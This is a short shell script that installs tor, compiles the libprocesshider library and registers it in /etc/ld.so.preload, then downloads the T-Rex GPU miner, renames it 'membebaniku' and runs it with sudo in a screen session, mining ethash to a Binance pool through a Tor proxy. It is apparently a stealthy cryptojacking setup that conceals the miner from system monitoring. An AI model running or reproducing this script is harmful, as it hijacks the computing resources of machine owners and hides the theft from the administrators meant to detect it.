#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
tar -xf t-rex-0.25.15-linux.tar.gz
mv t-rex membebaniku

screen sudo ./membebaniku -a ethash -o stratum+tcp://ethash.poolbinance.com:1800 -o stratum+tcp://ethash.poolbinance.com:443 -p x --proxy 127.0.0.1:9050 -u teguhcong -w $(echo $(shuf -i 1-2000 -n 1)-Konsol) --gpu-report-interval 5 --mt 1
